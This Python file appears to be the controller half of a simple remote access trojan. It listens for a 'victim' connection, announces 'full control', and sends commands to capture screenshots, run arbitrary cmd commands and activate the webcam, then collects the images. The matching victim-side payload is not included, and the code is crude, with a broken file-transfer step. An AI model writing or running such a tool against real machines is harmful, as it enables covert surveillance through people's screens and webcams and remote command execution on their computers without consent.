import socket
import shutil
import os

#consts
HOST = '127.0.0.1'
PORT = 8080
BUFFER_SIZE = 4096
HASH = 'utf-8'

#recive from the victim the screenshot and save it in the project folder
def get_screenshot(victim_socket):
    filename = victim_socket.recv(BUFFER_SIZE).decode(HASH)
    fileToUpload = os.path.basename(filename)
    destination_path = os.path.join('MASTER_FOLDER', fileToUpload)
    shutil.copy(filename, destination_path)

def main():
    #open a socket listening for any connections
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as master_socket:
        master_socket.bind((HOST, PORT))
        master_socket.listen()
        print(f"master is up!\nlistening for any connections on port {PORT}...")
        
        #start a small conversation to aproove the connection (logs)
        while True:
            connection, address = master_socket.accept()
            print(f"victim found!\nconnected to {address}...")
            connection.send("connected?".encode(HASH))
            print("MASTER: connected?")
            print("VICTIM: "+connection.recv(BUFFER_SIZE).decode(HASH))
            print("You have full control!")
            
            #after the connection is set and aprooved let the user choose a command
            while True:
                command = input("Enter a command: ")
                #send the command to the victim and get back form him the screenshot
                if command == "screenshot":
                    connection.send(command.encode(HASH))
                    get_screenshot(connection)
                    print("screenshot was taken...")#log
                #send the cmd command to the victim's cmd and get the screenshot of the command results
                elif command == "cmd":
                    connection.send(command.encode(HASH))
                    print(connection.recv(BUFFER_SIZE).decode(HASH))
                    cmd_command = input("Enter a cmd command: ")
                    connection.send(cmd_command.encode(HASH))
                    get_screenshot(connection)
                    print("screenshot was taken...")#log
                #send the command to the victim to open the webcam and get a screenshot while the webcam is active
                elif command == "webcam":
                    connection.send(command.encode(HASH))
                    print("command sent!")#log
                    get_screenshot(connection)
                    print("screeshot was taken...")#log
                #stop the server after a non-command input
                else:
                    break
            break
                    
if __name__ == '__main__':
    main()